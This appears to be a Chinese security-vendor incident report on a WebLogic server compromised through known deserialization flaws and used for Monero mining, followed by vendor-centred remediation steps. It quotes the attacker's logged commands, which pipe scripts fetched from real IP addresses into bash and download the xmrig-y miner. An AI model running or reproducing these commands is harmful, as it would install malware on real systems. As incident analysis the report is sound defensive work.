# 某企业IT管理员：我的网站又双叒叕被挖矿了，该怎么办？

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg2NjgzNjA5NQ==&mid=2247514151&idx=1&sn=ab6273d912a3dce20c73e467a68dcadd&chksm=ce463337f931ba21f759582bec0d6dd05d650fb57d43aa60d1e7cbbc5fee9898b1a20ffdb40b&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=Mzg2NjgzNjA5NQ==&mid=2247514151&idx=1&sn=ab6273d912a3dce20c73e467a68dcadd&chksm=ce463337f931ba21f759582bec0d6dd05d650fb57d43aa60d1e7cbbc5fee9898b1a20ffdb40b&scene=27#wechat_redirect)

近日，某企业内网服务器疑似出现病毒现象，经常卡顿，严重影响正常业务运行，该企业IT管理员非常害怕出现大面积感染情况。

该企业紧急部署了深信服安全感知（SIP）与终端检测响应平台（EDR）进行防御检测，通过二者联动，发现某台运行有weblogic的服务器存在虚拟货币挖矿的行为。

为了查明该网站又双叒叕被挖矿的根因，深信服安全感知，联合EDR安全团队，对服务器进行排查分析，发现该Linux服务器频繁被入侵，是由于存在weblogic漏洞。

最后，通过产品侧的检测与查杀，成功清理挖矿病毒。同时，通过安全专家服务，又即时摸清根因，防止再次发生。

 

如图，某台运行有weblogic的服务器短时间内CPU使用率飙升到80%以上。

![](../Images/c945306b904776e26cf47b61d9c1518c.png)

 

 

    

**溯源分析**

    

结合流量中的上百次的挖矿行为（SIP告警）与主机端扫描出的恶意文件（EDR检测），初步判断是通过Weblogic服务进行挖矿的一次恶意事件。

黑客可能通过利用 WebLogic 反序列化漏洞（CVE-2017-3248 ）和 WebLogic WLS 组件漏洞（CVE-2017-1027 1）对企业使用WebLogic WLS组件的业务进行入侵并植入挖矿木马。

通过查阅Linux的相关日志，发现有恶意用户通过执行curl命令与wget从远程服务器获取到脚本并使用bash命令成功执行。并且下载了名为xmrig-y的门罗币最块CPU挖矿软件

 

命令如下：

*curl 45.123.190.178/lin.txt| bash*

*wget -q0 -http://45.123.190.178/lin |bash*

*curl 45.123.190.178/lin.txt| bash*

*downloader http://165.227.215.25/xmrig-y*

 

详细的脚本内容参考如下

![](../Images/635e25559ebbfb7b99e059c6ba44700e.png)

该脚本首先会杀掉本机上的python和java程序，然后下载运行比特币的挖矿程序xmrig-y（xmrig-y.exe，该程序被多款杀毒软件标示为挖矿或恶意木马程序），然后伪装成java文件运行。

![](../Images/53ca1b0937584222a01e7eeac3589f03.png)

经过检查Weblogic的版本为12.1.1.0，且存在wls-wsat.war的war包

VT查杀进一步确认恶意文件样本。

![](../Images/53d262e4390330dd84e7ec945fae5e1d.png)

 

 

    

**解决方案**

    

 

1.部署深信服安全感知，对全网挖矿通信流量进行检测和定位。

![](../Images/38f0e1d07d1abc5a6b5fcdc2d6ac81ba.png)

注：截图来自真实企业环境，告警显示，已有100多次的矿池访问。

 

2.部署深信服终端检测响应平台，可联动安全感知，对目标主机进行查杀清理。

![](../Images/4918a07c68fd290caf8c1b245d4e6043.png)

注：截图来自真实企业环境。

 

3.删除wls-wsat应用包

WebLogic11g版本，wls-wsat应用包的位置：$WL\_HOME/server/lib/wls-wsat.war

 

4.删除每个WebLogic Server目录下的tmp目录（或者使用EDR Webshell查杀功能，进行清理）

有JSP网页木马已经潜伏在

$DOMAIN\_HOME/servers/SERVER\_NAME/tmp/\_WL\_internal/bea\_wls\_internal/目录下管理、被管Server均需执行。

位置：$DOMAIN\_HOME/servers/SERVER\_NAME/tmp
